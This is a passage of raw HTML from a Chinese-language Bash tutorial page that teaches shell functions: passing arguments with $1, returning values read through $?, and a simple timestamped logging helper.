crayon-striped-num\" data-line=\"crayon-5bab670a9ffcb789525599-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffcb789525599-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffcb789525599-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-i\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">function</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">sh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffcb789525599-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">function</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sh</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffcb789525599-3\"><span class=\"crayon-v\">Hello</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">World</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>你可以看到，上面的输出和之前的是一模一样的。</p>\n<h3 id=\"toc_3\">更多函数用法</h3>\n<p>在上一小节中我们定义了一个非常简单的函数。然而在软件开发的过程中，我们需要更多高级的函数，它可以接收多个参数并且带有返回值。在这一小节中，我们将讨论这种函数。</p>\n<h4 id=\"toc_4\">向函数传递参数</h4>\n<p>我们可以像调用其它命令那样给函数提供参数。我们可以在函数里使用美元 <code>$</code> 符号访问到这些参数。例如，<code>$1</code> 表示第一个参数，<code>$2</code> 代表第二个参数，以此类推。</p>\n<p>让我们修改下之前的函数，让它以参数的形式接收信息。修改后的函数就像这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffce737225948\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfunction print_msg {\r\n    echo \"Hello $1\"\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffce737225948-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffce737225948-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffce737225948-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffce737225948-1\"><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">print_msg</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffce737225948-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Hello $1\"</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffce737225948-3\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>在上面的函数中我们使用 <code>$1</code> 符号访问第一个参数。让我们执行这个函数：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffd2371940383\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ print_msg \"LinuxTechi\"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffd2371940383-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffd2371940383-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">print</span><span class=\"crayon-sy\">_</span>msg<span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"LinuxTechi\"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>执行完后，生成如下信息：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffd5440001112\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nHello LinuxTechi</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffd5440001112-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffd5440001112-1\"><span class=\"crayon-e\">Hello </span><span class=\"crayon-v\">LinuxTechi</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h4 id=\"toc_5\">从函数中返回数值</h4>\n<p>跟其它编程语言一样，Bash 提供了返回语句让我们可以向调用者返回一些数值。让我们举例说明：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffd8297103848\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfunction func_return_value {\r\n    return 10\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffd8297103848-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffd8297103848-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffd8297103848-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffd8297103848-1\"><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">func_return_value</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffd8297103848-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffd8297103848-3\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>上面的函数向调用者返回 <code>10</code>。让我们执行这个函数：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffdb186453342\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ func_return_value\r\n$ echo \"Value returned by function is: $?\"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffdb186453342-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffdb186453342-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffdb186453342-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">func_return</span><span class=\"crayon-sy\">_</span>value</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffdb186453342-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Value returned by function is: $?\"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>当你执行完，将会产生如下的输出结果：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffde738023191\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nValue returned by function is: 10</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffde738023191-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffde738023191-1\"><span class=\"crayon-e\">Value </span><span class=\"crayon-e\">returned </span><span class=\"crayon-e\">by </span><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">is</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><strong>提示</strong>：在 Bash 中使用 <code>$?</code> 去获取函数的返回值。</p>\n<h3 id=\"toc_6\">函数技巧</h3>\n<p>目前我们已经对 Bash 中的函数有了一些了解。现在让我们创建一些非常有用的 Bash 函数，它们可以让我们的生活变得更加轻松。</p>\n<h4 id=\"toc_7\">Logger</h4>\n<p>让我们创建一个 <code>logger</code> 函数，它可以输出带有日期和时间的 log 信息。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffe2243850167\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfunction log_msg {\r\n    echo \"[`date '+ %F %T'` ]: $@\"\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffe2243850167-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffe2243850167-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffe2243850167-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffe2243850167-1\"><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">log_msg</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffe2243850167-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"[`date '+ %F %T'` ]: $@\"</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffe2243850167-3\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>执行这个函数：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffe5483267666\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ log_msg \"This is sample log message\"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffe5483267666-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffe5483267666-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">log</span><span class=\"crayon-sy\">_</span>msg<span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"This is sample log message\"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>执行完，就会生成如下信息：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffe8358321269\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" 